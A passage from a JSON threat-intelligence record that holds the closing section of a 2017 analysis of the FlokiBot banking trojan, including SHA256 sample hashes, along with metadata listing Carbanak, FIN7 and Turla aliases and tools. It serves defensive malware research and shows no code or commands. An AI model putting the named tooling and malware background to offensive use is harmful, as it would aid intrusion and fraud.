Cybercriminals have been using remote desktops more and more since ATS became way too complex to code and too hard to deploy. This way, they get a full access to an infected computer to learn about the target and its habits and perform fraudulent tasks such as money transfer manually.\n\n## Final note & hashes\n\n#### FlokiBot is yet another malware kit based on ZeuS, with some pieces of code directly taken from the Carberp leak. Nevertheless, its dropper, its unhooking routine and its PoS malware feature make it an interesting malware to analyse. Also, its obfuscation techniques are simple enough to be reversed statically with some IDA scripts without making use of AppCall.\n\n @v0id_hunter uploaded the following SHA256 for some recent FlokiBot samples :\n\n```\n\n-----\n\n```\n23E8B7D0F9C7391825677C3F13FD2642885F6134636E475A3924BA5BDD1D4852\n997841515222dbfa65d1aea79e9e6a89a0142819eaeec3467c31fa169e57076a\nf778ca5942d3b762367be1fd85cf7add557d26794fad187c4511b3318aff5cfd\n7d97008b00756905195e9fc008bee7c1b398a940e00b0bd4c56920c875f28bfe\ndc21527bd925a7dc95b84167c162747069feb2f4e2c1645661a27e63dff8c326\n7e4b2edf01e577599d3a2022866512d7dd9d2da7846b8d3eb8cea7507fb6c92a\nfc391f843b265e60de2f44f108b34e64c358f8362507a8c6e2e4c8c689fcdf67\n943daa88fe4b5930cc627f14bf422def6bab6d738a4cafd3196f71f1b7c72539\nbbe8394eb3b752741df0b30e1d1487eeda7e94e0223055771311939d27d52f78\n6c479da2e2cc296c18f21ddecc787562f600088bd37cc2154c467b0af2621937\n01aab8341e1ef1a8305cf458db714a0392016432c192332e1cd9f7479507027f\n06dcf3dc4eab45c7bd5794aafe4d3f72bb75bcfb36bdbf2ba010a5d108b096dc\ndaf7d349b1b12d9cf2014384a70d5826ca3be6d05df13f7cb1af5b5f5db68d54\n24f56ba4d779b913fefed80127e9243303307728ebec85bdb5a61adc50df9eb6\na65e79bdf971631d2097b18e43af9c25f007ae9c5baaa9bda1c470af20e1347c\na47e6fab82ac654332f4e56efcc514cb2b45c5a126b9ffcd2c84a842fb0283a2\n07c25eebdbd16f176d0907e656224d6a4091eb000419823f989b387b407bfd29\n3c0f18157f30414bcfed7a138066bc25ef44a24c5f1e56abb0e2ab5617a91000\nfb836d9897f3e8b1a59ebc00f59486f4c7aec526a9e83b171fd3e8657aadd1a1\n966804ac9bc376bede3e1432e5800dd2188decd22c358e6f913fbaaaa5a6114d\n296c738805040b5b02eae3cc2b114c27b4fb73fa58bc877b12927492c038e27c\n61244d5f47bb442a32c99c9370b53ff9fc2ecb200494c144e8b55069bc2fa166\ncae95953c7c4c8219325074addc9432dee640023d18fa08341bf209a42352d7d\na0400125d98f63feecac6cb4c47ed2e0027bd89c111981ea702f767a6ce2ef75\n1f5e663882fa6c96eb6aa952b6fa45542c2151d6a9191c1d5d1deb9e814e5a50\n912d54589b28ee822c0442b664b2a9f05055ea445c0ec28f3352b227dc6aa2db\n691afe0547bd0ab6c955a8ec93febecc298e78342f78b3dd1c8242948c051de6\nc9bf4443135c080fb81ab79910c9cfb2d36d1027c7bf3e29ee2b194168a463a7\n5383e18c66271b210f93bee8cc145b823786637b2b8660bb32475dbe600be46e\nd96e5a74da7f9b204f3dfad6d33d2ab29f860f77f5348487f4ef5276f4262311\n\n#### Thank you for reading.\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-03-14 - Analyzing and Deobfuscating FlokiBot Banking Trojan.pdf"
    ],
    "report_names": [
        "2017-03-14 - Analyzing and Deobfuscating FlokiBot Banking Trojan.pdf"
    ],
    "threat_actors": [
        {
            "id": "c9617bb6-45c8-495e-9759-2177e61a8e91",
            "created_at": "2022-10-25T15:50:23.405039Z",
            "updated_at": "2025-03-27T02:00:55.462193Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Carbanak",
                "Anunak"
            ],
            "source_name": "MITRE:Carbanak",
            "tools": [
                "Carbanak",
                "Mimikatz",
                "PsExec",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536217,
    "ts_updated_at": 1743041818,
    "ts_creation_date": 1653693422,
    "ts_modification_date": 1653693422,
    "files": {
        "pdf": "https://archive.orkl.eu/2806d27461980e9a13fc13b698db66561ef4be00.pdf",
        "text": "https://archive.orkl.eu/2806d27461980e9a13fc13b698db66561ef4be00.txt",
        "img": "https://archive.orkl.eu/2806d27461980e9a13fc13b698db66561ef4be00.jpg"
    }
}